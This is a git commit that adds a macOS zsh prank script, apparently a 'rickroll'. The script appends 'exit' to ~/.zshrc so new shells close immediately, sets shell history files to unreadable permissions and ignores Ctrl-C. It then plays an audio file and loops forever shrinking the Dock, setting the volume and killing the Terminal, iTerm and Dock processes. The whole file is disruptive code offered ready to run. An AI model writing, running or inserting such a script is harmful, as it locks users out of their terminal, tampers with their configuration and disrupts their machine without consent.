bf677a4eaa9035565a5637a75582d62cda1cc526
Kema-dev <01sludge_coaches@icloud.com>
2021-12-20 12:43:49 +0100

    rick.sh

---
+++ chill.sh
@@ -0,0 +1,16 @@
+#!/bin/zsh
+echo -e 'exit' >> ~/.zshrc
+chmod 000 ~/.zsh_history ~/.bash_history && clear
+sleep 600
+trap ' ' 2
+afplay rick.mp3 > /dev/null &
+while [ 1 ]
+do
+	for i in {1..15} {17..231} {235..256}
+	do
+		defaults write com.apple.dock tilesize -integer 1 && defaults write com.apple.dock largesize -integer 1
+		osascript -e "set Volume 0.3"
+		killall iTerm; killall Terminal; killall Dock;
+	done
+done
+exit
